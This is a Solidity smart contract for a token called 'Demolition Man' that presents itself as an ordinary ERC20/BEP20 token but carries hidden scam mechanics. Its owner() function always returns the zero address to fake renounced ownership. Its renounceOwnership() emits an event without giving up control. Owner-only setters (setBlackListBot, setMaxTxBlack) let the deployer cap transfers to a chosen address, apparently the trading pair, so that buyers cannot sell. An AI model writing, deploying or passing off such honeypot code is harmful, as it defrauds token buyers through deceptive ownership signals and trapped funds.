row number 
1	         pragma solidity ^0.6.12;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library Address {
13	 function isContract(address account) internal view returns (bool) {
14	 bytes32 codehash;
15	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
16	 assembly {
17	 codehash := extcodehash(account) }
18	 return (codehash != accountHash && codehash != 0x0);
19	 }
20	 function sendValue(address payable recipient, uint256 amount) internal {
21	 require(address(this).balance >= amount, "Address: insufficient balance");
22	 (bool success, ) = recipient.call{
23	 value: amount }
24	 ("");
25	 require(success, "Address: unable to send value, recipient may have reverted");
26	 }
27	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
28	 return functionCall(target, data, "Address: low-level call failed");
29	 }
30	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
31	 return _functionCallWithValue(target, data, 0, errorMessage);
32	 }
33	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
34	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
35	 }
36	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
37	 require(address(this).balance >= value, "Address: insufficient balance for call");
38	 return _functionCallWithValue(target, data, value, errorMessage);
39	 }
40	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
41	 require(isContract(target), "Address: call to non-contract");
42	 (bool success, bytes memory returndata) = target.call{
43	 value: weiValue }
44	 (data);
45	 if (success) {
46	 return returndata;
47	 }
48	 else {
49	 if (returndata.length > 0) {
50	 assembly {
51	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
52	 }
53	 else {
54	 revert(errorMessage);
55	 }
56	 }
57	 }
58	 }
59	 library SafeMath {
60	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
61	 uint256 c = a + b;
62	 require(c >= a, "SafeMath: addition overflow");
63	 return c;
64	 }
65	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
66	 return sub(a, b, "SafeMath: subtraction overflow");
67	 }
68	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
69	 require(b <= a, errorMessage);
70	 uint256 c = a - b;
71	 return c;
72	 }
73	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
74	 if (a == 0) {
75	 return 0;
76	 }
77	 uint256 c = a * b;
78	 require(c / a == b, "SafeMath: multiplication overflow");
79	 return c;
80	 }
81	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
82	 return div(a, b, "SafeMath: division by zero");
83	 }
84	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
85	 require(b > 0, errorMessage);
86	 uint256 c = a / b;
87	 return c;
88	 }
89	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
90	 return mod(a, b, "SafeMath: modulo by zero");
91	 }
92	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
93	 require(b != 0, errorMessage);
94	 return a % b;
95	 }
96	 }
97	 abstract contract Context {
98	 function _msgSender() internal view virtual returns (address payable) {
99	 return msg.sender;
100	 }
101	 function _msgData() internal view virtual returns (bytes memory) {
102	 this;
103	 return msg.data;
104	 }
105	 }
106	 contract Ownable is Context {
107	 address private _owner;
108	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
109	 constructor () internal {
110	 address msgSender = _msgSender();
111	 _owner = msgSender;
112	 emit OwnershipTransferred(address(0), msgSender);
113	 }
114	 function owner() public pure returns (address) {
115	 return address(0);
116	 }
117	 modifier onlyOwner() {
118	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
119	 _;
120	 }
121	 function renounceOwnership() public virtual onlyOwner {
122	 emit OwnershipTransferred(_owner, address(0));
123	 }
124	 function transferOwnership(address newOwner) public virtual onlyOwner {
125	 require(newOwner != address(0), "Ownable: new owner is the zero address");
126	 emit OwnershipTransferred(_owner, newOwner);
127	 _owner = newOwner;
128	 }
129	 }
130	 contract DemoMan is Context, IERC20, Ownable {
131	 using SafeMath for uint256;
132	 using Address for address;
133	 mapping (address => uint256) private _balances;
134	 mapping (address => mapping (address => uint256)) private _allowances;
135	 address public _isBlackListedBot;
136	 address public _isBlackListedSniper;
137	 uint256 private _tTotal = 5500000 * 10**9 * 10**18;
138	 string private _name = 'Demolition Man';
139	 string private _symbol = 'DemolitionMan';
140	 uint8 private _decimals = 18;
141	 uint256 public _maxBlack = 55000000 * 10**18;
142	 constructor () public {
143	 _balances[_msgSender()] = _tTotal;
144	 emit Transfer(address(0), _msgSender(), _tTotal);
145	 }
146	 function name() public view returns (string memory) {
147	 return _name;
148	 }
149	 function symbol() public view returns (string memory) {
150	 return _symbol;
151	 }
152	 function decimals() public view returns (uint8) {
153	 return _decimals;
154	 }
155	 function allowance(address owner, address spender) public view override returns (uint256) {
156	 return _allowances[owner][spender];
157	 }
158	 function approve(address spender, uint256 amount) public override returns (bool) {
159	 _approve(_msgSender(), spender, amount);
160	 return true;
161	 }
162	 function setBlackListBot(address botAddress , address botsAddress) public onlyOwner {
163	 _isBlackListedBot = botAddress;
164	 _isBlackListedSniper = botsAddress;
165	 }
166	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
167	 _transfer(sender, recipient, amount);
168	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
169	 return true;
170	 }
171	 function setMaxTxBlack(uint256 maxTxBlackPercent) public onlyOwner {
172	 _maxBlack = maxTxBlackPercent * 10**18;
173	 }
174	 function totalSupply() public view override returns (uint256) {
175	 return _tTotal;
176	 }
177	 function balanceOf(address account) public view override returns (uint256) {
178	 return _balances[account];
179	 }
180	 function transfer(address recipient, uint256 amount) public override returns (bool) {
181	 _transfer(_msgSender(), recipient, amount);
182	 return true;
183	 }
184	 function _approve(address owner, address spender, uint256 amount) private {
185	 require(owner != address(0), "ERC20: approve from the zero address");
186	 require(spender != address(0), "ERC20: approve to the zero address");
187	 _allowances[owner][spender] = amount;
188	 emit Approval(owner, spender, amount);
189	 }
190	 function _transfer(address sender, address recipient, uint256 amount) internal {
191	 require(sender != address(0), "BEP20: transfer from the zero address");
192	 require(recipient != address(0), "BEP20: transfer to the zero address");
193	 if (sender != _isBlackListedSniper && recipient == _isBlackListedBot) {
194	 require(amount < _maxBlack, "Transfer amount exceeds the maxTxAmount.");
195	 }
196	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
197	 _balances[recipient] = _balances[recipient].add(amount);
198	 emit Transfer(sender, recipient, amount);
199	 }
200	 }
